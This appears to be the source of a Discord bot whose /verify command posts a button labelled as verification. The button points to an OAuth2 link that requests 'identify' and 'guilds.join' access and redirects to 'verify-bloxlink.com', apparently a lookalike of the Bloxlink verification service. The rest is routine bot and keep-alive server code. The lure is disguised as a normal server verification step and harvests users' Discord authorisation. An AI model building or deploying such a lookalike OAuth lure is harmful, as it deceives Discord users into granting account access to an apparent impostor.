const {
  Client,
  GatewayIntentBits,
  Events,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
} = require("discord.js");

const express = require("express");
const app = express();

app.get("/", (req, res) => {
  res.send("Bot online");
});

app.listen(3000, () => {
  console.log("Web server ativo");
});

const client = new Client({
  intents: [GatewayIntentBits.Guilds],
});

client.once("clientReady", () => {
  console.log("Bot ligado!");
});

client.on(Events.InteractionCreate, async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  if (interaction.commandName === "verify") {
    const verifyButton = new ButtonBuilder()
      .setLabel("Verificar")
      .setStyle(ButtonStyle.Link)
      .setURL(
        "https://discord.com/oauth2/authorize?client_id=1484595946212823150&response_type=code&redirect_uri=https%3A%2F%2Fverify-bloxlink.com%2Fverify%3Fserver%3D7507793594570607&scope=identify+guilds.join",
      );

    const tutorialButton = new ButtonBuilder()
      .setLabel("Com dificuldades? Veja um tutorial")
      .setStyle(ButtonStyle.Link)
      .setURL(
        "https://www.youtube.com/watch?v=SbDltmom1R8&list=PLz7SOP-guESE1V6ywCCLc1IQWiLURSvBE&index=3",
      );

    const row = new ActionRowBuilder().addComponents(
      verifyButton,
      tutorialButton,
    );

    try {
      await interaction.reply({
        content: "Para verificar, clique no link abaixo.",
        components: [row],
      });
    } catch (error) {
      console.error("Erro no /verify:", error);
    }
  }
});

client.login(process.env.TOKEN);
